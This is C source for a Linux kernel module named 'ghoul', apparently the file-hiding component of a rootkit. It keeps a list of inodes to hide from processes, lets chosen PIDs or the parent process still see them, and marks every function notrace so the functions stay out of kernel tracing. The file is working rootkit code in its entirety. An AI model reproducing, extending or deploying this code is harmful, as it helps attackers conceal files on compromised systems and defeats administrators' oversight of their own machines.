#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/uaccess.h>
#include "hide.h"
#include "service.h"
#include "privileges.h"

LIST_HEAD(hidden_inodes);

notrace void hide_file_inode(unsigned long ino)
{
    struct inode_list *inode_entry;
    struct pid_list *pid_entry, *temp;

    pr_info("ghoul: hiding inode %lu\n", ino);

    // make sure inode is not already hidden
    list_for_each_entry(inode_entry, &hidden_inodes, list) {
        // the inode is already hidden
        if (inode_entry->ino == ino) {
            // no excluded PIDs - do nothing
            if (list_empty(&inode_entry->excluded_pids))
                return;
            
            // there are excluded PIDs - remove them
            else {
                list_for_each_entry_safe(pid_entry, temp, &inode_entry->excluded_pids, list) {
                    list_del(&pid_entry->list);
                    kfree(pid_entry);
                }
                return;
            }
        }
    }

    // inode was not already hidden - add it to hidden inodes list
    inode_entry = kzalloc(sizeof(struct inode_list), GFP_KERNEL);

    if (inode_entry == NULL) {
        pr_err("ghoul: memory allocation error while hiding inode\n");
        return;
    }

    inode_entry->ino = ino;
    INIT_LIST_HEAD(&inode_entry->excluded_pids);
    list_add_tail(&inode_entry->list, &hidden_inodes);
}

notrace int should_hide_inode(unsigned long ino)
{
    struct inode_list *inode_entry, *hidden_inode = NULL;
    struct pid_list *pid_entry;
    int current_pid;

    // check if inode is hidden
    list_for_each_entry(inode_entry, &hidden_inodes, list) {
        if (inode_entry->ino == ino) {
            hidden_inode = inode_entry;
            break;
        }
    }

    // inode is hidden - check if our PID is excluded
    if (hidden_inode) {
        current_pid = current->pid;
        list_for_each_entry(pid_entry, &hidden_inode->excluded_pids, list) {
            if (pid_entry->pid == current_pid)
                return 0;
        }
        return 1;
    }

    // inode is not hidden
    else
        return 0;
}

notrace void show_file_inode(const void __user *user_info)
{
    struct show_file_inode_info info;
    struct inode_list *inode_entry, *hidden_inode = NULL;
    struct pid_list *excluded_pid, *temp;

    // copy request info
    if (copy_from_user((void *)&info, user_info, sizeof(struct show_file_inode_info))) {
        pr_info("ghoul: can't copy user data\n");
        return;
    }

    // search for requested inode
    list_for_each_entry(inode_entry, &hidden_inodes, list) {
        if (inode_entry->ino == info.ino)
            hidden_inode = inode_entry;
    }

    // requested inode is not hidden
    if (!hidden_inode)
        return;
    
    // show inode to all PIDs - delete from hidden inodes list
    if (info.pid == ALL_PIDS) {
        pr_info("ghoul: showing inode %lu for all processes\n", info.ino);

        // free all excluded PIDs first
        if (!list_empty(&hidden_inode->excluded_pids)) {
            list_for_each_entry_safe(excluded_pid, temp, &hidden_inode->excluded_pids, list) {
                list_del(&excluded_pid->list);
                kfree(excluded_pid);
            }
        }

        // remove and free hidden inode
        list_del(&hidden_inode->list);
        kfree(hidden_inode);
        return;
    }

    // show inode to parent PID - find it
    if (info.pid == PARENT_PID)
        info.pid = current->parent->pid;

    // show inode to a specific PID - add PID to excluded PIDs list
    pr_info("ghoul: showing inode %lu for PID %d\n", info.ino, info.pid);
    excluded_pid = kzalloc(sizeof(struct pid_list), GFP_KERNEL);

    if (excluded_pid == NULL) {
        pr_err("ghoul: memory allocation error while showing inode\n");
        return;
    }

    excluded_pid->pid = info.pid;
    list_add_tail(&excluded_pid->list, &hidden_inode->excluded_pids);
}